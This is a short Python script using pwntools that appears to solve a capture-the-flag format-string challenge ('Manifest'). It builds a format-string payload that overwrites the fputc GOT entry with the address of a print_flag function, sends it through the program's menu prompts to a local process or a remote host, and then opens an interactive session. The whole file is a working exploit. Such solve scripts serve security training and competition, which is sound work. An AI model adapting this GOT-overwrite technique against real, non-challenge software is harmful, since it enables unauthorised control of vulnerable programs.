from pwn import *
import argparse


def get_io(binary, host, port, use_remote):
    if use_remote:
        return remote(host, port)
    return process(binary)


def main():
    parser = argparse.ArgumentParser(description="Manifest format-string solve")
    parser.add_argument("--remote", action="store_true", help="use remote host/port")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=1337)
    parser.add_argument("--binary", default="manifest/chall/awd")
    args = parser.parse_args()

    elf = ELF(args.binary)
    context.binary = elf
    context.arch = "amd64"

    fputc_got = elf.got["fputc"]
    print_flag = elf.symbols["print_flag"]

    payload = fmtstr_payload(
        5,
        {fputc_got: p64(print_flag)},
        write_size="short",
        write_size_max="short",
        strategy="small",
    )

    io = get_io(args.binary, args.host, args.port, args.remote)
    io.sendlineafter(b"choice>", b"7")
    io.sendafter(b"incident>", payload + b"\n")
    io.interactive()


if __name__ == "__main__":
    main()
